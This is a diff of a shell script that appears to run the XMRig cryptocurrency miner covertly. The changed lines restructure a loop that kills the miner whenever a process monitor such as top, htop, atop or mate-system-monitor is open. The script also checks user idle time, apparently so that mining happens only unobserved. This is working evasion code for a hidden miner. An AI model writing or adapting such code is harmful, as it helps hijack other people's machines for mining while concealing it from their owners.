@@ -27,11 +27,6 @@ run_xmr() {
 	fi		 
 }
 
-ensure_no_top() {
-	if pgrep "top" || pgrep "htop" || pgrep "atop" || pgrep "mate-system-mon"; then
-		pkill $XMRIGNAME
-	fi
-}
 
 main() {
 	ensure_os
@@ -39,7 +34,12 @@ main() {
 	isUI=$(who | grep -q "(:[0-9])" && echo 1 || echo 0)
 
 	while true; do 
-		ensure_no_top
+		sleep 1
+		
+		if pgrep "top" || pgrep "htop" || pgrep "atop" || pgrep "mate-system-mon"; then
+			pkill $XMRIGNAME
+			continue
+		fi
 
 		if [[ isUI -eq 1 ]]; then
 			idle=$(xprintidle)
@@ -66,7 +66,6 @@ main() {
 				pkill $XMRIGNAME
 			fi
 		fi
-		sleep 1
 	done
 }
 
